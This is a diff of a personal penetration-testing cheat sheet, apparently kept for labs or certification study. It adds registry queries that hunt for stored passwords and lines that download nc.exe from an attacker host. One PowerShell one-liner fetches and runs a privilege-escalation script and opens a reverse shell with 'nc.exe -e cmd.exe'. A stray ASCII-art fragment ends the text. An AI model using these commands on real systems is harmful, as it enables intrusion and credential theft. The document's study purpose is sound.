@@ -2,6 +2,8 @@
 
 [Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)
 
+[https://book.hacktricks.xyz/](a lot of good stuff)
+
 ## Automatic web enum
 - dirb | dirsearch
 - linpeas
@@ -57,6 +59,7 @@
 - mount:
   - --script=nfs-ls,nfs-statfs,nfs-showmount
 - browser cache
+- Enumerate register
 - scheduled task
 - UAC
 - Check loggings
@@ -68,6 +71,15 @@
   - icalcs
 - eventvwr
 - RCE admin: change user
+  
+### Registry
+- Passwords:
+  - REG QUERY HKLM /F "password" /t REG_SZ /S /K
+  - REG QUERY HKCU /F "password" /t REG_SZ /S /K
+  - REG QUERY HKLM /F "password" /t REG_SZ /S /d
+  - REG QUERY HKCU /F "password" /t REG_SZ /S /d
+  - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
+
 
 ### SMB
 - smbmap -H $target = Check Privileges 
@@ -116,7 +128,11 @@
 ### Windows
 - powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
-- certutil -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
+- certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
+- iex (New-Object Net.WebClient).DownloadString('http://$attacking/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+     __ __ ___ ___   ___     ___ ___ ___ 
+    |
+
   
 ### Linux
 - wget attacker-machine:8000:file.ext
